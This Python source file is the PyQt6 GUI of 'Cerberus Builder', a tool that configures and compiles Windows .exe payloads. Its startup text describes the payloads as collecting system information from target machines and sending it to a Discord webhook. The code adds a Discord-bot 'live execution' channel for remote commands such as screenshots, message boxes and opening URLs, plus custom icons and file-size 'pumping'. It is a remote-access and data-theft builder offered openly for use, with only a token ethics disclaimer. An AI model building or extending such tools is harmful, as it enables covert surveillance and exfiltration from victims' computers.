# F:/Cerebus/cerberus_gui.py
import sys
import os
import re
import time
import traceback 
import json 
import webbrowser

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QMessageBox, QFileDialog, QComboBox,
    QPlainTextEdit, QTextEdit, QLabel # Added QLabel for rich text in QMessageBox
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QSettings
from PyQt6.QtGui import QIcon, QFont

# ... (rest of your imports: app_config, ui_styler, ui_setup, build_worker, builder_sender_client) ...
from app_config import (
    DEFAULT_APP_ICON_FILENAME, DEFAULT_PAYLOAD_ICO_FILENAME,
    DEFAULT_PAYLOAD_NAME, APP_TITLE, APP_VERSION,
    ORGANIZATION_NAME, APPLICATION_NAME,
    DEFAULT_FONT_SIZE, MIN_FONT_SIZE, MAX_FONT_SIZE,
    DISCORD_INVITE_URL, YOUTUBE_URL, GITHUB_URL,
    DISCORD_BOT_TOKEN, COMMAND_CHANNEL_ID
)
from ui_styler import apply_app_styles
from ui_setup import setup_main_window_ui
from build_worker import BuildWorker 
try:
    from live_payload_components import builder_sender_client 
except ImportError as e:
    print(f"ERROR: Could not import 'builder_sender_client' from 'live_payload_components': {e}")
    if not QApplication.instance(): QApplication([]) # type: ignore
    QMessageBox.critical(None, "Import Error", "Failed to import Builder's Discord components.\nApplication will exit.")
    sys.exit(1)


class CerberusBuilderApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.user_selected_icon_path = None 
        self.project_root = os.path.dirname(os.path.abspath(__file__))
        self.default_app_icon_path = os.path.join(self.project_root, "icons", DEFAULT_APP_ICON_FILENAME)
        self.default_payload_ico_path = os.path.join(self.project_root, "icons", DEFAULT_PAYLOAD_ICO_FILENAME)
        self.build_thread = None 
        self.build_worker = None 
        self.discord_client_initialized = False

        self.load_settings()        
        self.init_ui_structure()    
        self.apply_current_styles() 
        self.connect_signals() 
        self.init_discord_builder_sender() 

        action_combobox_widget = getattr(self, 'action_combobox', None)
        if action_combobox_widget:
            self.on_action_selected(action_combobox_widget.currentIndex())
        
        # Show the info box on startup
        self.show_startup_info_box() # <--- NEW METHOD CALL

    def show_startup_info_box(self):
        """Displays an informational pop-up on application startup."""
        title = f"{APP_TITLE} v{APP_VERSION} - Information"
        
        # Using HTML for better formatting within QMessageBox
        #Triple quotes for multi-line string
        message_html = """
        <html>
        <head>
            <style>
                body {{ font-family: Segoe UI, sans-serif; font-size: 9pt; }}
                h2 {{ color: #DC143C; }} /* Crimson Red */
                h3 {{ color: #E04040; margin-bottom: 2px; margin-top: 8px;}}
                p {{ margin-bottom: 6px; }}
                ul {{ margin-top: 0px; padding-left: 20px; }}
                li {{ margin-bottom: 3px; }}
                code {{ font-family: Consolas, monospace; background-color: #333; color: #DDD; padding: 1px 3px; border-radius: 3px;}}
                .responsibility {{ font-weight: bold; color: #FFD700; text-align: center; font-size: 10pt; margin-top:15px}}
            </style>
        </head>
        <body>
            <h2>Credits</h2>
            <p><strong>Main Developer:</strong> Xenos (Itzrealde)</p>
            <p>Thank you for using Cerberus Builder!</p>

            <h2>How It Works</h2>
            <p>This application (the "Builder") allows you to configure and generate payloads. 
            These payloads, when run on a target Windows machine, collect system information 
            and send it to a specified Discord webhook.</p>
            <p>The "Live Execution Mode" enables remote command execution on the payload via a Discord bot, 
            allowing for actions like taking screenshots or displaying messages without direct P2P connections.</p>

            <h2>File Layout Overview</h2>
            <p>The project is structured for modularity:</p>
            <ul>
                <li><code>main.py</code>: Application entry point.</li>
                <li><code>cerberus_gui.py</code>: Main application window and UI logic (this app).</li>
                <li><code>app_config.py</code>: Stores constants, URLs, and theme colors.</li>
                <li><code>ui_setup.py</code>: Defines the GUI element structure.</li>
                <li><code>ui_styler.py</code>: Handles QSS styling for the GUI.</li>
                <li><code>build_worker.py</code>: Manages the asynchronous payload build process.</li>
                <li><code>file_utils.py</code>: Generates the payload script content.</li>
                <li><code>system_info.py</code>: Contains functions to gather system information for the payload.</li>
                <li><code>webhook_utils.py</code>: Handles sending data to Discord webhooks.</li>
                <li><code>icons/</code>: Stores application and payload icons.</li>
                <li><code>live_payload_components/</code>:
                    <ul>
                        <li><code>builder_sender_client.py</code>: Builder's Discord bot logic (to send commands).</li>
                        <li><code>payload_discord_client.py</code>: Payload's Discord bot logic (to listen for commands).</li>
                        <li><code>payload_actions.py</code>: Functions executed by the payload on command.</li>
                    </ul>
                </li>
            </ul>
            <p>This layout separates concerns: UI, core logic, payload generation, and live command components, making the project easier to understand and maintain.</p>
            
            <p class="responsibility">WITH GREAT POWER COMES GREAT RESPONSIBILITY.</p>
            <p style="text-align:center; font-size:8pt;">Use this tool ethically and responsibly.</p>
        </body>
        </html>
        """

        # QMessageBox can display rich text (HTML)
        info_box = QMessageBox(self)
        info_box.setWindowTitle(title)
        info_box.setIcon(QMessageBox.Icon.Information)
        
        # To use HTML, we need to set a QLabel as the text, because settext() does not parse html fully
        # However, setInformativeText and setText combined can sometimes work for simpler HTML.
        # For complex HTML, it's better to use a custom dialog or set a custom widget.
        # A simpler way for QMessageBox is to use its setTextFormat(Qt.TextFormat.RichText)
        # and then setText().

        info_box.setTextFormat(Qt.TextFormat.RichText) # Allow HTML interpretation
        info_box.setText("<h3>Welcome to Cerberus Builder!</h3>") # Main brief text
        info_box.setInformativeText(message_html) # Detailed HTML content
        
        # Adjust size if needed, though QMessageBox tries to auto-size
        # info_box.layout().setSizeConstraint(QLayout.SetFixedSize) # Optional

        info_box.setStandardButtons(QMessageBox.StandardButton.Ok)
        info_box.setDefaultButton(QMessageBox.StandardButton.Ok)
        
        # Apply custom styling to the QMessageBox if desired (optional)
        # This QSS is very basic and might need theme color integration from app_config
        info_box.setStyleSheet(f"""
            QMessageBox {{
                background-color: #2D2D2D; /* Mid Background */
                font-size: 9pt;
            }}
            QMessageBox QLabel {{ /* Target the labels inside QMessageBox */
                color: #D0D0D0; /* Light Gray Text */
                background-color: transparent;
            }}
            QMessageBox QPushButton {{
                background-color: #4A4A4A; /* Dark Gray Border (as button bg) */
                color: #D0D0D0;
                border: 1px solid #5A5A5A;
                padding: 5px 15px;
                border-radius: 3px;
                min-width: 60px;
            }}
            QMessageBox QPushButton:hover {{
                background-color: #5A5A5A;
            }}
            QMessageBox QPushButton:pressed {{
                background-color: #3A3A3A;
            }}
        """)

        info_box.exec()

    # ... (rest of your CerberusBuilderApp methods: init_discord_builder_sender, load_settings, etc.)
    # Ensure all methods from the previous "full fixed code" are present here.
    # I'm only showing __init__ and the new show_startup_info_box for brevity.
    # Make sure to integrate this into the complete CerberusBuilderApp class.

    def init_discord_builder_sender(self): # Copied from previous full code
        send_command_button_widget = getattr(self, 'send_command_button', None)
        if not DISCORD_BOT_TOKEN or 'YOUR_' in DISCORD_BOT_TOKEN.upper() or len(DISCORD_BOT_TOKEN) < 20:
            self.log_to_gui("Discord Bot Token not configured. Command sending disabled.")
            if send_command_button_widget: send_command_button_widget.setEnabled(False)
            self.discord_client_initialized = False
            return

        self.log_to_gui("Initializing Builder's Discord sender client...")
        if builder_sender_client.initialize_builder_discord_sender(DISCORD_BOT_TOKEN):
            self.log_to_gui("Builder's Discord sender client initialized successfully.")
            self.discord_client_initialized = True
            if send_command_button_widget: send_command_button_widget.setEnabled(True)
        else:
            self.log_to_gui("Failed to init Builder's Discord sender. Check token/network. Cmd sending disabled.")
            QMessageBox.critical(self, "Discord Client Error",
                                 "Could not initialize Discord client for sending commands.\n"
                                 "Check Bot Token and internet. Command sending disabled.")
            if send_command_button_widget: send_command_button_widget.setEnabled(False)
            self.discord_client_initialized = False

    def load_settings(self): # Copied
        settings = QSettings(ORGANIZATION_NAME, APPLICATION_NAME)
        loaded_size_str = settings.value("fontSize", str(DEFAULT_FONT_SIZE))
        try: loaded_size = int(loaded_size_str)
        except ValueError: loaded_size = DEFAULT_FONT_SIZE
        self.current_font_size = max(MIN_FONT_SIZE, min(loaded_size, MAX_FONT_SIZE))

    def save_settings(self): # Copied
        settings = QSettings(ORGANIZATION_NAME, APPLICATION_NAME)
        settings.setValue("fontSize", str(self.current_font_size))

    def apply_current_styles(self): # Copied
        app = QApplication.instance()
        if not app: return
        try:
            current_font = app.font(); current_font.setPointSize(self.current_font_size); app.setFont(current_font)
            log_widgets_names = ['log_output_area', 'command_log_area']
            for name in log_widgets_names:
                widget = getattr(self, name, None)
                if widget: 
                    log_font = QFont("Consolas", self.current_font_size -1); 
                    try: log_font.setFamily("Consolas")
                    except: pass 
                    widget.setFont(log_font)
        except Exception as e: 
            log_func = self.log_to_gui if hasattr(self, 'log_output_area') and self.log_output_area else print
            log_func(f"Font application error: {e}")
        apply_app_styles(app, self)

    def init_ui_structure(self): # Copied
        self.setWindowTitle(f"{APP_TITLE} v{APP_VERSION}")
        def early_log(message): print(f"[{time.strftime('%H:%M:%S')}] [EARLY_LOG] {message}")
        log_func_current = self.log_to_gui if hasattr(self, 'log_output_area') and self.log_output_area else early_log
        
        if os.path.exists(self.default_app_icon_path): 
            self.setWindowIcon(QIcon(self.default_app_icon_path))
        else: 
            log_func_current(f"Warning: Default app icon not found: '{self.default_app_icon_path}'")
        
        setup_main_window_ui(self)
        
        footer_label_widget = getattr(self, 'footer_label', None)
        if footer_label_widget:
            footer_label_widget.setText(f"{APP_TITLE} v{APP_VERSION} | Font: {self.current_font_size}pt | Config persists.")
        
        log_func_ready = self.log_to_gui if hasattr(self, 'log_output_area') and self.log_output_area else early_log
        bot_token_ok = DISCORD_BOT_TOKEN and 'YOUR_' not in DISCORD_BOT_TOKEN.upper() and len(DISCORD_BOT_TOKEN)>20
        chan_id_ok = COMMAND_CHANNEL_ID and 'YOUR_' not in COMMAND_CHANNEL_ID.upper() and COMMAND_CHANNEL_ID.isdigit()
        log_func_ready(f"Discord Bot Token: {'Set' if bot_token_ok else 'Not Set/Placeholder'}")
        log_func_ready(f"Command Channel ID: {'Set' if chan_id_ok else 'Not Set/Placeholder'}")

    def connect_signals(self): # Copied
        select_icon_button_widget = getattr(self, 'select_icon_button', None)
        if select_icon_button_widget: select_icon_button_widget.clicked.connect(self.select_payload_icon)
        clear_icon_button_widget = getattr(self, 'clear_icon_button', None)
        if clear_icon_button_widget: clear_icon_button_widget.clicked.connect(self.clear_payload_icon)
        pump_checkbox_widget = getattr(self, 'pump_checkbox', None)
        pump_spinbox_widget = getattr(self, 'pump_size_spinbox', None)
        if pump_checkbox_widget and pump_spinbox_widget: pump_checkbox_widget.toggled.connect(pump_spinbox_widget.setEnabled)
        build_button_widget = getattr(self, 'build_button', None)
        if build_button_widget: build_button_widget.clicked.connect(self.start_build_process)
        zoom_in_button_widget = getattr(self, 'zoom_in_button', None)
        if zoom_in_button_widget: zoom_in_button_widget.clicked.connect(self.zoom_in)
        zoom_out_button_widget = getattr(self, 'zoom_out_button', None)
        if zoom_out_button_widget: zoom_out_button_widget.clicked.connect(self.zoom_out)
        discord_button_widget = getattr(self, 'discord_button', None)
        if discord_button_widget: discord_button_widget.clicked.connect(self.open_discord_invite)
        youtube_button_widget = getattr(self, 'youtube_button', None)
        if youtube_button_widget: youtube_button_widget.clicked.connect(self.open_youtube_channel)
        github_button_widget = getattr(self, 'github_button', None)
        if github_button_widget: github_button_widget.clicked.connect(self.open_github_profile)
        action_combobox_widget = getattr(self, 'action_combobox', None)
        if action_combobox_widget: action_combobox_widget.currentIndexChanged.connect(self.on_action_selected)
        send_command_button_widget = getattr(self, 'send_command_button', None)
        if send_command_button_widget: send_command_button_widget.clicked.connect(self.send_live_command)

    def send_live_command(self): # Copied
        if not self.discord_client_initialized:
            self.log_command_status("Error: Discord client (sender) not initialized.")
            QMessageBox.warning(self, "Client Error", "Discord client not ready. Check logs/restart."); return

        target_id_widget = getattr(self, 'target_payload_id_input', None)
        action_combobox_widget = getattr(self, 'action_combobox', None)
        action_arg_input_widget = getattr(self, 'action_arg_input', None)
        target_id = target_id_widget.text().strip() if target_id_widget else ""
        action = action_combobox_widget.currentText() if action_combobox_widget else "--- Select Action ---"
        args = action_arg_input_widget.text().strip() if action_arg_input_widget else ""
        
        if not target_id: self.log_command_status("Error: Target ID required."); QMessageBox.warning(self, "Input Error", "Target ID required."); return
        if action == "--- Select Action ---": self.log_command_status("Error: Action required."); QMessageBox.warning(self, "Input Error", "Action required."); return
        req_args_actions = ["Show Message Box", "Change Wallpaper (URL)", "Open URL"]
        if action in req_args_actions and not args: self.log_command_status(f"Error: Args required for {action}."); QMessageBox.warning(self, "Input Error", f"Args required for {action}."); return

        command_data = {"target_id": target_id, "action": action, "args": args}
        command_message_str = json.dumps(command_data)
        
        self.log_command_status(f"Sending command to channel {COMMAND_CHANNEL_ID}: {command_message_str}")
        success = builder_sender_client.send_command_from_builder(COMMAND_CHANNEL_ID, command_message_str)
        if success: self.log_command_status("Command message sent to Discord."); QMessageBox.information(self, "Command Sent", "Command sent.")
        else: self.log_command_status("Failed to send command to Discord."); QMessageBox.warning(self, "Send Error", "Could not send command.")

    def log_command_status(self, message): # Copied
        command_log_area_widget = getattr(self, 'command_log_area', None)
        timestamp = time.strftime('%H:%M:%S')
        if command_log_area_widget: command_log_area_widget.appendPlainText(f"[{timestamp}] {message}")
        print(f"[{timestamp}] [COMMAND_LOG] {message}")

    def on_action_selected(self, index): # Copied
        action_combobox_widget = getattr(self, 'action_combobox', None)
        action_arg_label_widget = getattr(self, 'action_arg_label', None)
        action_arg_input_widget = getattr(self, 'action_arg_input', None)
        if not (action_combobox_widget and action_arg_label_widget and action_arg_input_widget): return 

        selected_action = action_combobox_widget.currentText()
        actions_requiring_args = ["Show Message Box", "Change Wallpaper (URL)", "Open URL"]
        show_args_fields = selected_action in actions_requiring_args
        action_arg_label_widget.setVisible(show_args_fields)
        action_arg_input_widget.setVisible(show_args_fields)
        if show_args_fields:
            placeholders = {
                "Show Message Box": "Enter message text for the target",
                "Change Wallpaper (URL)": "Enter direct image URL for wallpaper",
                "Open URL": "Enter full URL (e.g., https://...)"}
            action_arg_input_widget.setPlaceholderText(placeholders.get(selected_action, "Enter required argument(s)"))
        else: 
            action_arg_input_widget.clear()
            action_arg_input_widget.setPlaceholderText("Arguments (if any)" if selected_action != "Take Screenshot" else "No arguments needed")

    def zoom_in(self): # Copied
        footer_widget = getattr(self, 'footer_label', None)
        if self.current_font_size < MAX_FONT_SIZE:
            self.current_font_size += 1; self.log_to_gui(f"Zoom In: Font {self.current_font_size}pt"); self.apply_current_styles(); self.save_settings()
            if footer_widget: footer_widget.setText(f"{APP_TITLE} v{APP_VERSION} | Font: {self.current_font_size}pt | Config persists.")
        else: self.log_to_gui(f"Zoom In: Max font ({MAX_FONT_SIZE}pt)")

    def zoom_out(self): # Copied
        footer_widget = getattr(self, 'footer_label', None)
        if self.current_font_size > MIN_FONT_SIZE:
            self.current_font_size -= 1; self.log_to_gui(f"Zoom Out: Font {self.current_font_size}pt"); self.apply_current_styles(); self.save_settings()
            if footer_widget: footer_widget.setText(f"{APP_TITLE} v{APP_VERSION} | Font: {self.current_font_size}pt | Config persists.")
        else: self.log_to_gui(f"Zoom Out: Min font ({MIN_FONT_SIZE}pt)")

    def _open_url(self, url, link_name): # Copied
        if url and "YOUR_" not in url.upper() and (url.startswith("http://") or url.startswith("https://")):
            try:
                self.log_to_gui(f"Opening {link_name}: {url}"); 
                opened = webbrowser.open(url) 
                if not opened: 
                    self.log_to_gui(f"webbrowser.open failed for {link_name}.")
                    QMessageBox.warning(self, "Browser Err", f"Could not open {link_name}.")
            except Exception as e: 
                self.log_to_gui(f"Err opening {link_name}: {e}")
                QMessageBox.warning(self, "Err", f"Err opening {link_name}:\n{e}")
        else: 
            self.log_to_gui(f"{link_name} link invalid.")
            QMessageBox.information(self, "Info", f"{link_name} link not set.")

    def open_discord_invite(self): self._open_url(DISCORD_INVITE_URL, "Discord") # Copied
    def open_youtube_channel(self): self._open_url(YOUTUBE_URL, "YouTube") # Copied
    def open_github_profile(self): self._open_url(GITHUB_URL, "GitHub") # Copied

    def log_to_gui(self, message): # Copied
        log_widget = getattr(self, 'log_output_area', None)
        timestamp = time.strftime('%H:%M:%S')
        if log_widget: 
            log_widget.appendPlainText(f"[{timestamp}] {message}")
        print(f"[{timestamp}] [BUILDER_LOG] {message}")

    def select_payload_icon(self): # Copied
        start_dir = os.path.join(self.project_root, "icons"); 
        if not os.path.isdir(start_dir): start_dir = self.project_root
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Payload Icon", start_dir, "Icon Files (*.ico)")
        if file_path:
            if not file_path.lower().endswith('.ico'): 
                QMessageBox.warning(self, "Invalid Icon", "Select .ico file."); 
                self.log_to_gui(f"Invalid icon: {file_path}"); return
            self.user_selected_icon_path = file_path
            icon_label = getattr(self, 'icon_display_label', None)
            if icon_label: icon_label.setText(f"Icon: {os.path.basename(file_path)}")
            self.log_to_gui(f"Custom icon: {file_path}")

    def clear_payload_icon(self): # Copied
        self.user_selected_icon_path = None
        icon_label = getattr(self, 'icon_display_label', None)
        if icon_label: icon_label.setText("Icon: Default")
        if os.path.exists(self.default_payload_ico_path): 
            self.log_to_gui(f"Icon reset to default ('{os.path.basename(self.default_payload_ico_path)}').")
        else: self.log_to_gui("Icon reset to default (PyInstaller). Default .ico not found.")

    def start_build_process(self): # Contains the simplified log_c creation
        # --- Step 1: Gather and Validate UI Inputs ---
        webhook_url_input_widget = getattr(self, 'webhook_url_input', None)
        webhook_url = webhook_url_input_widget.text().strip() if webhook_url_input_widget else ""
        output_name_input_widget = getattr(self, 'output_name_input', None)
        out_name_raw = output_name_input_widget.text().strip() if output_name_input_widget else ""
        output_name = out_name_raw or DEFAULT_PAYLOAD_NAME
        
        if not webhook_url: QMessageBox.warning(self, "Config Err", "Results Webhook URL req."); self.log_to_gui("Build Err: Webhook empty."); return
        webhook_regex = r"^https?://(?:(?:ptb\.|canary\.)?discord(?:app)?\.com/api(?:/v\d+)?/webhooks/\d+/[a-zA-Z0-9_-]+|webhook\.link/.*)$"
        if not re.match(webhook_regex, webhook_url): QMessageBox.warning(self, "Config Err", "Invalid Discord Webhook URL."); self.log_to_gui("Build Err: Invalid Webhook."); return
        if not output_name.lower().endswith('.exe'):
            output_name += '.exe'; 
            if output_name_input_widget: output_name_input_widget.setText(output_name)
        
        actual_icon = None
        if self.user_selected_icon_path:
            if os.path.exists(self.user_selected_icon_path) and self.user_selected_icon_path.lower().endswith('.ico'): actual_icon = self.user_selected_icon_path
            else: self.log_to_gui(f"Warn: Sel icon '{self.user_selected_icon_path}' invalid. Using default."); self.clear_payload_icon()
        if not actual_icon and os.path.exists(self.default_payload_ico_path): actual_icon = self.default_payload_ico_path

        # --- Step 2: Construct the Main Configuration Dictionary ---
        live_exec_cb = getattr(self, 'live_execution_checkbox', None)
        sys_overview_cb = getattr(self, 'sysinfo_overview_checkbox', None); sys_hw_cb = getattr(self, 'sysinfo_hardware_checkbox', None)
        sys_netconn_cb = getattr(self, 'sysinfo_network_connectivity_checkbox', None); sys_activeif_cb = getattr(self, 'sysinfo_active_interfaces_checkbox', None)
        sys_storage_cb = getattr(self, 'sysinfo_storage_checkbox', None); sys_miscnet_cb = getattr(self, 'sysinfo_misc_network_checkbox', None)
        pump_cb_widget = getattr(self, 'pump_checkbox', None); pump_spin_widget = getattr(self, 'pump_size_spinbox', None)

        config = {
            'webhook_url': webhook_url, 'payload_icon': actual_icon, 'output_name': output_name,
            'live_execution_mode': live_exec_cb.isChecked() if live_exec_cb else False,
            'discord_bot_token': DISCORD_BOT_TOKEN, 
            'command_channel_id': COMMAND_CHANNEL_ID,
            'include_sysinfo_overview': sys_overview_cb.isChecked() if sys_overview_cb else True,
            'include_sysinfo_hardware': sys_hw_cb.isChecked() if sys_hw_cb else True,
            'include_sysinfo_network_connectivity': sys_netconn_cb.isChecked() if sys_netconn_cb else True,
            'include_sysinfo_active_interfaces': sys_activeif_cb.isChecked() if sys_activeif_cb else True,
            'include_sysinfo_storage': sys_storage_cb.isChecked() if sys_storage_cb else True,
            'include_sysinfo_misc_network': sys_miscnet_cb.isChecked() if sys_miscnet_cb else False,
            'pump_size_mb': pump_spin_widget.value() if pump_cb_widget and pump_cb_widget.isChecked() and pump_spin_widget else 0,
            'project_root': self.project_root,
        }

        # --- Step 3: Prepare UI for Build Start & Log Initial Info ---
        build_btn = getattr(self,'build_button', None); prog_bar = getattr(self,'progress_bar', None); stat_label = getattr(self,'status_label', None)
        if build_btn: build_btn.setEnabled(False)
        if prog_bar: prog_bar.setValue(0)
        if stat_label: stat_label.setText("Status: Starting build...")
        
        self.log_to_gui(f"Build initiated for: {config.get('output_name', 'UnknownOutput')}")
        
        # --- Step 4: SIMPLIFIED log_c CREATION ---
        log_c = {}
        log_c['output_name_for_log'] = config.get('output_name', 'N/A') # Using _for_log to avoid any Pylance confusion
        log_c['live_execution_mode_for_log'] = config.get('live_execution_mode', False)
        log_c['webhook_url_is_set_for_log'] = bool(config.get('webhook_url'))
        
        bot_token_for_log_val = config.get('discord_bot_token', '')
        log_c['bot_token_is_configured_for_log'] = bool(bot_token_for_log_val and 'YOUR_' not in bot_token_for_log_val.upper())
        
        cmd_channel_for_log_val = config.get('command_channel_id', '')
        log_c['command_channel_id_is_configured_for_log'] = bool(cmd_channel_for_log_val and cmd_channel_for_log_val.isdigit())

        icon_path_val_for_log = config.get('payload_icon')
        icon_log_str = "PyInstaller Default" 
        if icon_path_val_for_log and isinstance(icon_path_val_for_log, str):
            if os.path.exists(icon_path_val_for_log):
                icon_log_str = os.path.basename(icon_path_val_for_log)
            else:
                icon_log_str = f"'{os.path.basename(icon_path_val_for_log)}' (Not Found)"
        log_c['icon_used_for_log'] = icon_log_str
            
        log_c['pump_size_mb_for_log'] = config.get('pump_size_mb', 0)
        log_c['include_overview_for_log'] = config.get('include_sysinfo_overview', False) 
        # You can add more items from 'config' to 'log_c' here explicitly if desired
            
        self.log_to_gui(f"Build Config (for logging): {log_c}")
        # --- END OF SIMPLIFIED log_c CREATION ---

        # --- Step 5: Start Build Thread ---
        if self.build_thread and self.build_thread.isRunning(): 
            QMessageBox.warning(self, "Busy", "Build process is already active.")
            if build_btn: 
                build_btn.setEnabled(True)
            return 
        
        self.build_thread = QThread(self)
        self.build_worker = BuildWorker(config) 
        self.build_worker.moveToThread(self.build_thread)
        
        if prog_bar: self.build_worker.progress.connect(prog_bar.setValue)
        if stat_label: self.build_worker.status.connect(lambda msg: stat_label.setText(f"Status: {msg}"))
        self.build_worker.status.connect(self.log_to_gui)
        self.build_worker.finished_signal.connect(self.on_build_complete)
        
        self.build_worker.finished_signal.connect(self.build_worker.deleteLater)
        self.build_thread.started.connect(self.build_worker.run)
        self.build_thread.finished.connect(self.build_thread.deleteLater)
        self.build_thread.finished.connect(self.on_thread_actually_finished)
        
        self.build_thread.start()
        self.log_to_gui(f"Target: dist/{config.get('output_name', 'UnknownOutput')}")

    def on_build_complete(self, success, message, output_path=None): # Copied
        prog_bar = getattr(self,'progress_bar', None); stat_label = getattr(self,'status_label', None)
        self.log_to_gui(f"Build End. OK: {success}. Msg: {message}")
        if prog_bar: prog_bar.setValue(100 if success else prog_bar.value())
        if stat_label: stat_label.setText(f"Status: {'OK!' if success else 'Failed!'}")
        if success and output_path:
            disp_path = output_path 
            try: disp_path = os.path.relpath(output_path, self.project_root)
            except ValueError: pass
            QMessageBox.information(self, "Build OK", f"Payload '{os.path.basename(output_path)}' done.\nAt: {disp_path}")
        elif not success:
            mbox = QMessageBox(self); mbox.setIcon(QMessageBox.Icon.Critical); mbox.setWindowTitle("Build Failed")
            mbox.setText("Build error."); mbox.setInformativeText("Check log & details.")
            det_txt = str(message); mbox.setDetailedText(det_txt[:3997]+"..." if len(det_txt)>4000 else det_txt)
            txt_edit = mbox.findChild(QTextEdit) or mbox.findChild(QPlainTextEdit)  # type: ignore
            if txt_edit: txt_edit.setMinimumSize(500,200)  # type: ignore
            mbox.exec()
        if self.build_thread and self.build_thread.isRunning(): self.build_thread.quit() 

    def on_thread_actually_finished(self): # Copied
        self.log_to_gui("Build thread resources released.")
        build_btn = getattr(self,'build_button', None); stat_label = getattr(self,'status_label', None)
        if build_btn: build_btn.setEnabled(True)
        if stat_label:
            stat = stat_label.text().lower()
            if "failed" not in stat and "error" not in stat and "ok" not in stat: stat_label.setText("Status: Ready.")
            elif "ok" in stat: stat_label.setText("Status: Ready for next build.")

    def closeEvent(self, event): # Copied
        self.log_to_gui("Close event. Shutting down...")
        if self.discord_client_initialized:
            self.log_to_gui("Shutting down Builder's Discord sender...")
            builder_sender_client.shutdown_builder_discord_sender()
            self.log_to_gui("Discord sender shutdown initiated.")
        self.save_settings()
        if self.build_thread and self.build_thread.isRunning():
            reply = QMessageBox.question(self, 'Build Active',"Build running. Exit?", QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                self.log_to_gui("Terminating build on exit."); 
                stat_label = getattr(self,'status_label', None)
                if stat_label: stat_label.setText("Status: Terminating build...")
                self.build_thread.quit(); 
                if not self.build_thread.wait(1500): self.build_thread.terminate(); self.build_thread.wait()
                event.accept()
            else: event.ignore()
        else: event.accept()

# No __main__ block here, it's in main.py